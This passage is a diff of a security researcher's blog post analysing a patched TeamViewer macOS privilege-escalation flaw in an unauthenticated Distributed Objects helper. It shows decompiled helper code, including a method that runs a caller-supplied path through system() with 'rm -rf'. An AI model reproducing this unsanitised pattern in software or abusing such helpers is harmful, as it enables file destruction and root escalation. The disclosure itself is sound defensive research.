@@ -1,392 +1,182 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-
 <head>
-  <title>
-  NOCVE - TeamViewer Local Privilege Escalation Vulnerability · theevilbit blog
-</title>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="color-scheme" content="light dark">
-
-
-
-
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>NOCVE - TeamViewer Local Privilege Escalation Vulnerability · theevilbit</title>
+<meta name="description" content="This is a rather old vulnerability I found in TeamViewer back in 2020, and reported it through VCP/iDefense. TeamViewer fixed the vulnerability last November, but somehow I missed it, and became aware of it only recently">
 <meta name="author" content="Csaba Fitzl">
-<meta name="description" content="
-  Intro
-  
-    
-    Link to heading
-  
-
-This is a rather old vulnerability I found in TeamViewer back in 2020, and reported it through VCP/iDefense. TeamViewer fixed the vulnerability last November, but somehow I missed it, and became aware of it only recently. Their advisory can be found here:
-November updates - Security patches — TeamViewer Support
-The TeamViewer macOS client used a PrivilegedHelperTool named com.teamviewer.Helper to perform specific tasks that require root
-permissions. Back in 2020 it used a deprecate model to perform IPC communication, called Distributed Objects. It was wide open, and any client could invoke the remote object&rsquo;s functions, and some of those lead to direct privilege escalation.">
-<meta name="keywords" content="blog,macos,apple,security,vulnerability,exploit,cve">
-
-
-
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="NOCVE - TeamViewer Local Privilege Escalation Vulnerability">
-  <meta name="twitter:description" content="Intro Link to heading This is a rather old vulnerability I found in TeamViewer back in 2020, and reported it through VCP/iDefense. TeamViewer fixed the vulnerability last November, but somehow I missed it, and became aware of it only recently. Their advisory can be found here: November updates - Security patches — TeamViewer Support
-The TeamViewer macOS client used a PrivilegedHelperTool named com.teamviewer.Helper to perform specific tasks that require root permissions. Back in 2020 it used a deprecate model to perform IPC communication, called Distributed Objects. It was wide open, and any client could invoke the remote object’s functions, and some of those lead to direct privilege escalation.">
-
-<meta property="og:url" content="https://theevilbit.github.io/posts/teamviewer_lpe/">
-  <meta property="og:site_name" content="theevilbit blog">
-  <meta property="og:title" content="NOCVE - TeamViewer Local Privilege Escalation Vulnerability">
-  <meta property="og:description" content="Intro Link to heading This is a rather old vulnerability I found in TeamViewer back in 2020, and reported it through VCP/iDefense. TeamViewer fixed the vulnerability last November, but somehow I missed it, and became aware of it only recently. Their advisory can be found here: November updates - Security patches — TeamViewer Support
-The TeamViewer macOS client used a PrivilegedHelperTool named com.teamviewer.Helper to perform specific tasks that require root permissions. Back in 2020 it used a deprecate model to perform IPC communication, called Distributed Objects. It was wide open, and any client could invoke the remote object’s functions, and some of those lead to direct privilege escalation.">
-  <meta property="og:locale" content="en">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2021-05-26T00:00:00+00:00">
-    <meta property="article:modified_time" content="2021-05-26T00:00:00+00:00">
-    <meta property="article:tag" content="Macos">
-    <meta property="article:tag" content="Lpe">
-    <meta property="article:tag" content="Exploit">
-
-
-
-
 <link rel="canonical" href="https://theevilbit.github.io/posts/teamviewer_lpe/">
-
-
-<link rel="preload" href="https://theevilbit.github.io/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="https://theevilbit.github.io/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="https://theevilbit.github.io/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
-
-
-  
-  
-  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.4410e480b3bad72c110a96b56e5aa8c36c24a0f3735b278818123b0fa4393fcd.css" integrity="sha256-RBDkgLO61ywRCpa1blqow2wkoPNzWyeIGBI7D6Q5P80=" crossorigin="anonymous" media="screen" />
-
-
-
-
-
-
-  
-    
-    
-    <link rel="stylesheet" href="https://theevilbit.github.io/css/coder-dark.min.ad48f476275974885bdc03d5251e3cdbe1678c54a63ff772376b0ed2adc468dd.css" integrity="sha256-rUj0didZdIhb3APVJR482&#43;FnjFSmP/dyN2sO0q3EaN0=" crossorigin="anonymous" media="screen" />
-  
-
-
-
- 
-
-
-
-
-<link rel="icon" type="image/svg+xml" href="https://theevilbit.github.io/images/favicon.svg" sizes="any">
-<link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
-<link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">
-
-<link rel="apple-touch-icon" href="https://theevilbit.github.io/images/apple-touch-icon.png">
-<link rel="apple-touch-icon" sizes="180x180" href="https://theevilbit.github.io/images/apple-touch-icon.png">
-
-<link rel="manifest" href="https://theevilbit.github.io/site.webmanifest">
-<link rel="mask-icon" href="https://theevilbit.github.io/images/safari-pinned-tab.svg" color="#5bbad5">
-
-
-
-
-
-
-
-
-
+<link rel="alternate" type="application/rss+xml" title="theevilbit" href="/index.xml">
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<script>try { var t = localStorage.getItem("tb.theme"); document.documentElement.dataset.theme = t || "dark"; } catch (e) { document.documentElement.dataset.theme = "dark"; }</script>
+<link rel="preload" href="/fonts/IBMPlexSans-var.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="stylesheet" href="/fonts.css?v=1791269065">
+<link rel="stylesheet" href="/style.css?v=1791269065">
 </head>
-
-
-
-
-
-
-<body class="preload-transitions colorscheme-auto">
-  
-<div class="float-container">
-    <a id="dark-mode-toggle" class="colorscheme-toggle">
-        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
-    </a>
-</div>
-
-
-  <main class="wrapper">
-    <nav class="navigation">
-  <section class="container">
-    
-    <a class="navigation-title" href="https://theevilbit.github.io/">
-      theevilbit blog
-    </a>
-    
-    
-      <input type="checkbox" id="menu-toggle" />
-      <label class="menu-button float-right" for="menu-toggle">
-        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
-      </label>
-      <ul class="navigation-list">
-        
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/posts/">Posts</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/talks/">Talks and Workshops</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/shield/">Shield.app</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/beyond/">Beyond good ol&#39; LaunchAgents</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/tags/">Tags</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="https://theevilbit.github.io/about/">About</a>
-            </li>
-          
-        
-        
-      </ul>
-    
-  </section>
-</nav>
-
-
-    <div class="content">
-      
-  <section class="container post">
-    <article>
-      <header>
-        <div class="post-title">
-          <h1 class="title">
-            <a class="title-link" href="https://theevilbit.github.io/posts/teamviewer_lpe/">
-              NOCVE - TeamViewer Local Privilege Escalation Vulnerability
-            </a>
-          </h1>
-        </div>
-        <div class="post-meta">
-          <div class="date">
-            <span class="posted-on">
-              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
-              <time datetime="2021-05-26T00:00:00Z">
-                May 26, 2021
-              </time>
-            </span>
-            <span class="reading-time">
-              <i class="fa-solid fa-clock" aria-hidden="true"></i>
-              6-minute read
-            </span>
-          </div>
-          
-          <div class="categories">
-  <i class="fa-solid fa-folder" aria-hidden="true"></i>
-    <a href="https://theevilbit.github.io/categories/blog/">BLOG</a></div>
-
-          <div class="tags">
-  <i class="fa-solid fa-tag" aria-hidden="true"></i>
-    <span class="tag">
-      <a href="https://theevilbit.github.io/tags/macos/">Macos</a>
-    </span>
-      <span class="separator">•</span>
-    <span class="tag">
-      <a href="https://theevilbit.github.io/tags/lpe/">Lpe</a>
-    </span>
-      <span class="separator">•</span>
-    <span class="tag">
-      <a href="https://theevilbit.github.io/tags/exploit/">Exploit</a>
-    </span></div>
-
-        </div>
-      </header>
-
-      <div class="post-content">
-        
-        <h2 id="intro">
-  Intro
-  <a class="heading-link" href="#intro">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
+<body>
+<div class="wrap">
+  <header class="top">
+    <a class="brand" href="/">the<span>evil</span>bit<i class="cursor"></i></a>
+    <nav class="nav"><a href="/posts/" class=on>Posts</a><a href="/beyond/">Beyond</a><a href="/talks/">Talks</a><a href="/shield/">Shield</a><a href="/about/">About</a><a href="/tags/">Tags</a></nav>
+    <button type="button" class="theme" id="theme" aria-label="switch light / dark">◐</button>
+  </header>
+  <main><article class="post">
+<header class="post-head"><h1>NOCVE - TeamViewer Local Privilege Escalation Vulnerability</h1>
+<div class="meta"><time datetime="2021-05-26">May 26, 2021</time><span>5 min read</span><span class="tags"><a class="tag" href="/tags/macos/">macos</a><a class="tag" href="/tags/lpe/">lpe</a><a class="tag" href="/tags/exploit/">exploit</a></span></div></header>
+<details class="toc"><summary>Contents</summary><ol><li class="l2"><a href="#intro">Intro</a></li><li class="l2"><a href="#the-distributed-objects-interface">The Distributed Objects interface</a></li><li class="l2"><a href="#the-privilegedhelpertool">The PrivilegedHelperTool</a></li><li class="l2"><a href="#uninstallremoteprinting---arbitrary-file-deletion">uninstallRemotePrinting - Arbitrary file deletion</a></li><li class="l2"><a href="#installremoteprinting---user-to-root-privilege-escalation">installRemotePrinting - user to root privilege escalation</a></li><li class="l3"><a href="#fix">Fix</a></li></ol></details><div class="prose"><h2 id="intro">Intro<a class="anchor" href="#intro" aria-label="link to this section">#</a></h2>
 <p>This is a rather old vulnerability I found in TeamViewer back in 2020, and reported it through VCP/iDefense. TeamViewer fixed the vulnerability last November, but somehow I missed it, and became aware of it only recently. Their advisory can be found here:
-<a href="https://community.teamviewer.com/English/discussion/107710/november-updates-security-patches"  class="external-link" target="_blank" rel="noopener">November updates - Security patches — TeamViewer Support</a></p>
+<a href="https://community.teamviewer.com/English/discussion/107710/november-updates-security-patches" rel="noopener">November updates - Security patches — TeamViewer Support</a></p>
 <p>The TeamViewer macOS client used a PrivilegedHelperTool named <code>com.teamviewer.Helper</code> to perform specific tasks that require <code>root</code>
-permissions. Back in 2020 it used a deprecate model to perform IPC communication, called Distributed Objects. It was wide open, and any client could invoke the remote object&rsquo;s functions, and some of those lead to direct privilege escalation.</p>
-<h2 id="the-distributed-objects-interface">
-  The Distributed Objects interface
-  <a class="heading-link" href="#the-distributed-objects-interface">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
-<p>Apple&rsquo;s developer document regarding Distributed Objects can be found here:
-<a href="https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DistrObjects/DistrObjects.html"  class="external-link" target="_blank" rel="noopener">Introduction to Distributed Objects</a>
+permissions. Back in 2020 it used a deprecate model to perform IPC communication, called Distributed Objects. It was wide open, and any client could invoke the remote object's functions, and some of those lead to direct privilege escalation.</p>
+<h2 id="the-distributed-objects-interface">The Distributed Objects interface<a class="anchor" href="#the-distributed-objects-interface" aria-label="link to this section">#</a></h2>
+<p>Apple's developer document regarding Distributed Objects can be found here:
+<a href="https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DistrObjects/DistrObjects.html" rel="noopener">Introduction to Distributed Objects</a>
 Ian Beer from Google Project zero also talked about these:
-<a href="https://googleprojectzero.blogspot.com/2015/09/revisiting-apple-ipc-1-distributed_28.html"  class="external-link" target="_blank" rel="noopener">Project Zero: Revisiting Apple IPC: (1) Distributed Objects</a>.</p>
-<p>It&rsquo;s somewhat similar to NSXPC on a very high level. Let&rsquo;s see how we can identify and exploit it.</p>
-<h2 id="the-privilegedhelpertool">
-  The PrivilegedHelperTool
-  <a class="heading-link" href="#the-privilegedhelpertool">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
-<p>If we decompile the EntryPoint of the helper tool we can spot that it uses this interface.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">EntryPoint</span>(<span style="color:#078;font-weight:bold">int</span> arg0, <span style="color:#078;font-weight:bold">int</span> arg1, <span style="color:#078;font-weight:bold">int</span> arg2, <span style="color:#078;font-weight:bold">int</span> arg3) {
-</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> sub_10000612d();
-</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
-</span></span><span style="display:flex;"><span>    r13 <span style="color:#555">=</span> rax;
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
-</span></span><span style="display:flex;"><span>            r15 <span style="color:#555">=</span> [[NSConnection <span style="color:#99f">connectionWithReceivePort</span>:r13 <span style="color:#99f">sendPort</span>:<span style="color:#f60">0x0</span>] <span style="color:#069;font-weight:bold">retain</span>];
-</span></span><span style="display:flex;"><span>            rax <span style="color:#555">=</span> [BlessedHelperDistantObject alloc];
-</span></span><span style="display:flex;"><span>            rax <span style="color:#555">=</span> [rax init];
-</span></span><span style="display:flex;"><span>            r12 <span style="color:#555">=</span> rax;
-</span></span><span style="display:flex;"><span>            [r15 <span style="color:#99f">setRootObject</span>:rax];
-</span></span><span style="display:flex;"><span>            rax <span style="color:#555">=</span> [NSRunLoop currentRunLoop];
-</span></span><span style="display:flex;"><span>            rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
-</span></span><span style="display:flex;"><span>            [rax run];
-</span></span><span style="display:flex;"><span>            rbx <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
-</span></span><span style="display:flex;"><span>            [rax <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>            [r12 <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>            [r15 <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> {
-</span></span><span style="display:flex;"><span>            rbx <span style="color:#555">=</span> <span style="color:#f60">0x1</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    [r13 <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> rbx;
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> rax;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">sub_10000612d</span>() {
-</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> launch_data_new_string(<span style="color:#c30">&#34;CheckIn&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
-</span></span><span style="display:flex;"><span>            r15 <span style="color:#555">=</span> rax;
-</span></span><span style="display:flex;"><span>            rax <span style="color:#555">=</span> launch_msg(rax);
-</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
-</span></span><span style="display:flex;"><span>                    r14 <span style="color:#555">=</span> rax;
-</span></span><span style="display:flex;"><span>                    rax <span style="color:#555">=</span> launch_data_dict_lookup(rax, <span style="color:#c30">&#34;Label&#34;</span>);
-</span></span><span style="display:flex;"><span>                    <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
-</span></span><span style="display:flex;"><span>                            r12 <span style="color:#555">=</span> launch_data_get_string(rax);
-</span></span><span style="display:flex;"><span>                    }
-</span></span><span style="display:flex;"><span>                    <span style="color:#069;font-weight:bold">else</span> {
-</span></span><span style="display:flex;"><span>                            r12 <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
-</span></span><span style="display:flex;"><span>                    }
-</span></span><span style="display:flex;"><span>                    rax <span style="color:#555">=</span> launch_data_dict_lookup(r14, <span style="color:#c30">&#34;MachServices&#34;</span>);
-</span></span><span style="display:flex;"><span>                    rbx <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
-</span></span><span style="display:flex;"><span>                    <span style="color:#069;font-weight:bold">if</span> (r12 <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
-</span></span><span style="display:flex;"><span>                            rbx <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
-</span></span><span style="display:flex;"><span>                            <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
-</span></span><span style="display:flex;"><span>                                    rax <span style="color:#555">=</span> launch_data_dict_lookup(rax, r12);
-</span></span><span style="display:flex;"><span>                                    <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
-</span></span><span style="display:flex;"><span>                                            rax <span style="color:#555">=</span> launch_data_get_machport(rax);
-</span></span><span style="display:flex;"><span>                                            <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
-</span></span><span style="display:flex;"><span>                                                    rbx <span style="color:#555">=</span> [[NSMachPort alloc] <span style="color:#99f">initWithMachPort</span>:rax];
-</span></span><span style="display:flex;"><span>                                            }
-</span></span><span style="display:flex;"><span>                                            <span style="color:#069;font-weight:bold">else</span> {
-</span></span><span style="display:flex;"><span>                                                    rbx <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
-</span></span><span style="display:flex;"><span>                                            }
-</span></span><span style="display:flex;"><span>                                    }
-</span></span><span style="display:flex;"><span>                                    <span style="color:#069;font-weight:bold">else</span> {
-</span></span><span style="display:flex;"><span>                                            rbx <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
-</span></span><span style="display:flex;"><span>                                    }
-</span></span><span style="display:flex;"><span>                            }
-</span></span><span style="display:flex;"><span>                    }
-</span></span><span style="display:flex;"><span>                    launch_data_free(r14);
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">else</span> {
-</span></span><span style="display:flex;"><span>                    rbx <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>            launch_data_free(r15);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> {
-</span></span><span style="display:flex;"><span>            rbx <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    [rbx autorelease];
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p><code>NSConnection</code> is a clear indication, but the <code>launch_data_*</code> also a good hint towards this.</p>
+<a href="https://googleprojectzero.blogspot.com/2015/09/revisiting-apple-ipc-1-distributed_28.html" rel="noopener">Project Zero: Revisiting Apple IPC: (1) Distributed Objects</a>.</p>
+<p>It's somewhat similar to NSXPC on a very high level. Let's see how we can identify and exploit it.</p>
+<h2 id="the-privilegedhelpertool">The PrivilegedHelperTool<a class="anchor" href="#the-privilegedhelpertool" aria-label="link to this section">#</a></h2>
+<p>If we decompile the EntryPoint of the helper tool we can spot that it uses this interface. </p>
+<pre><code class=language-objectivec>int EntryPoint(int arg0, int arg1, int arg2, int arg3) {
+    rax = sub_10000612d();
+    rax = [rax retain];
+    r13 = rax;
+    if (rax != 0x0) {
+            r15 = [[NSConnection connectionWithReceivePort:r13 sendPort:0x0] retain];
+            rax = [BlessedHelperDistantObject alloc];
+            rax = [rax init];
+            r12 = rax;
+            [r15 setRootObject:rax];
+            rax = [NSRunLoop currentRunLoop];
+            rax = [rax retain];
+            [rax run];
+            rbx = 0x0;
+            [rax release];
+            [r12 release];
+            [r15 release];
+    }
+    else {
+            rbx = 0x1;
+    }
+    [r13 release];
+    rax = rbx;
+    return rax;
+}
+
+void sub_10000612d() {
+    rax = launch_data_new_string("CheckIn");
+    if (rax != 0x0) {
+            r15 = rax;
+            rax = launch_msg(rax);
+            if (rax != 0x0) {
+                    r14 = rax;
+                    rax = launch_data_dict_lookup(rax, "Label");
+                    if (rax != 0x0) {
+                            r12 = launch_data_get_string(rax);
+                    }
+                    else {
+                            r12 = 0x0;
+                    }
+                    rax = launch_data_dict_lookup(r14, "MachServices");
+                    rbx = 0x0;
+                    if (r12 != 0x0) {
+                            rbx = 0x0;
+                            if (rax != 0x0) {
+                                    rax = launch_data_dict_lookup(rax, r12);
+                                    if (rax != 0x0) {
+                                            rax = launch_data_get_machport(rax);
+                                            if (rax != 0x0) {
+                                                    rbx = [[NSMachPort alloc] initWithMachPort:rax];
+                                            }
+                                            else {
+                                                    rbx = 0x0;
+                                            }
+                                    }
+                                    else {
+                                            rbx = 0x0;
+                                    }
+                            }
+                    }
+                    launch_data_free(r14);
+            }
+            else {
+                    rbx = 0x0;
+            }
+            launch_data_free(r15);
+    }
+    else {
+            rbx = 0x0;
+    }
+    [rbx autorelease];
+    return;
+}
+</code></pre>
+<p><code>NSConnection</code> is a clear indication, but the <code>launch_data_*</code> also a good hint towards this. </p>
 <p>Based on the name, we can make an educated guess that the class responsible for the connection is <code>BlessedHelperDistantObject</code>. If we do a class-dump on the help tool, we can get the class interface.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@interface</span> <span style="color:#0a8;font-weight:bold">BlessedHelperDistantObject</span> : <span style="color:#0a8;font-weight:bold">NSObject</span> <span style="color:#555">&lt;</span>BlessedHelperProxy<span style="color:#555">&gt;</span>
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">struct</span> AuthorizationOpaqueRef <span style="color:#555">*</span>_authorization;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@property</span>(<span style="color:#069;font-weight:bold">nonatomic</span>) <span style="color:#069;font-weight:bold">struct</span> AuthorizationOpaqueRef <span style="color:#555">*</span>authorization; <span style="color:#09f;font-style:italic">// @synthesize authorization=_authorization;
-</span></span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">uninstallRemotePrinting:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
-</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#c0f">installRemotePrinting:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
-</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">configureTestMaster:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
-</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">deleteAuthPlugin</span>;
-</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#c0f">helperSignatureMatchesSignatureOfBundleAtURL:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">helperName:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span>;
-</span></span><span style="display:flex;"><span>- (<span style="color:#069;font-weight:bold">struct</span> __SecRequirement <span style="color:#555">*</span>)<span style="color:#c0f">copyOwnRequirementForHelperName:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
-</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">uninstall:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
-</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">writeLaunchdPropertyLists:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
-</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">deleteTVinOverridesPlist:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
-</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">loadDaemon:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
-</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#c0f">run:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span>;
-</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">terminate</span>;
-</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#c0f">runWithArguments:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">helperName:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span>;
-</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#c0f">needsUpdate:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">helperName:</span>(<span style="color:#078;font-weight:bold">id</span>)<span style="color:#033">arg2</span>;
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@property</span>(<span style="color:#069;font-weight:bold">readonly</span>, <span style="color:#069;font-weight:bold">copy</span>, <span style="color:#069;font-weight:bold">nonatomic</span>) NSString <span style="color:#555">*</span>version;
-</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">dealloc</span>;
-</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">id</span>)<span style="color:#c0f">init</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Remaining properties
-</span></span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@property</span>(<span style="color:#069;font-weight:bold">readonly</span>, <span style="color:#069;font-weight:bold">copy</span>) NSString <span style="color:#555">*</span>debugDescription;
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@property</span>(<span style="color:#069;font-weight:bold">readonly</span>, <span style="color:#069;font-weight:bold">copy</span>) NSString <span style="color:#555">*</span>description;
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@property</span>(<span style="color:#069;font-weight:bold">readonly</span>) <span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#078;font-weight:bold">long</span> <span style="color:#078;font-weight:bold">long</span> hash;
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@property</span>(<span style="color:#069;font-weight:bold">readonly</span>) <span style="color:#078;font-weight:bold">Class</span> superclass;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@end</span>
-</span></span></code></pre></div><p>There are quite a few interesting methods, but we will focus on <code>installRemotePrinting</code> and <code>uninstallRemotePrinting</code>. Unfortunately we don&rsquo;t get an indication of the passed arguments from the class-dump.</p>
-<h2 id="uninstallremoteprinting---arbitrary-file-deletion">
-  uninstallRemotePrinting - Arbitrary file deletion
-  <a class="heading-link" href="#uninstallremoteprinting---arbitrary-file-deletion">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
-<p>Let&rsquo;s inspect  <code>uninstallRemotePrinting</code> first.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* @class BlessedHelperDistantObject */</span>
-</span></span><span style="display:flex;"><span>-(<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">uninstallRemotePrinting:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> {
-</span></span><span style="display:flex;"><span>    system([objc_retainAutorelease([[NSString <span style="color:#99f">stringWithFormat</span>:<span style="color:#c30">@&#34;rm -rf &#39;%@&#39;&#34;</span>, [[[[arg2 stringArguments] <span style="color:#069;font-weight:bold">retain</span>] remotePrintingPPDPath] <span style="color:#069;font-weight:bold">retain</span>]] <span style="color:#069;font-weight:bold">retain</span>]) UTF8String]);
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    r14 <span style="color:#555">=</span> [[rax remotePrintingFilterPath] <span style="color:#069;font-weight:bold">retain</span>];
